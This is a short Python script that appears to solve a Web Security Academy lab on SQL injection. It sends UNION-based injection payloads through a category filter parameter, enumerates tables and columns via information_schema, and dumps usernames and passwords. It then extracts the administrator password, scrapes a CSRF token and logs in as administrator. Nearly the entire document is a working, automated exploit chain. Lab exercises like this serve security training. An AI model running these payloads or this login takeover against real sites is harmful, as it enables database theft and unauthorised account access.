# Lab: SQL injection attack, listing the database contents on non-Oracle databases

import requests 
import re

url = "https://0a5d002003bf94adc0494801005d00af.web-security-academy.net/"

cookies = dict(session="l5ds7YPrXmYVEoa0XJRkpp5Y9ruF4w29")

# PAYLOAD = "' ORDER BY 2 -- -"
# PAYLOAD = "' UNION SELECT 'a',version() -- -"
# PAYLOAD = "' UNION SELECT NULL,table_name || ' --- ' || table_schema || ' --- ' || table_type || ' --- ' || table_schema FROM information_schema.tables -- -"
# PAYLOAD = "' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'users_ulkkdf'-- -"
PAYLOAD = "' UNION SELECT 'username = ' || username_ssowpx, 'password = ' || password_pddqzk FROM users_ulkkdf -- -"
params = dict(category=PAYLOAD)

session = requests.Session()

r = session.get(url + 'filter', params=params, cookies=cookies)

pwd = re.findall(r'password = (.*)</td>', r.text)

print(f"Administrator:{pwd[2]}")

r2 = session.get(url + 'login', cookies=cookies)
csrf = re.findall(r'csrf" value="(.*)">', r2.text)

data = {
	"username": "administrator",
	"password": pwd[2],
	"csrf": csrf[0]
}

session.post(url + "login", data = data, cookies=cookies)
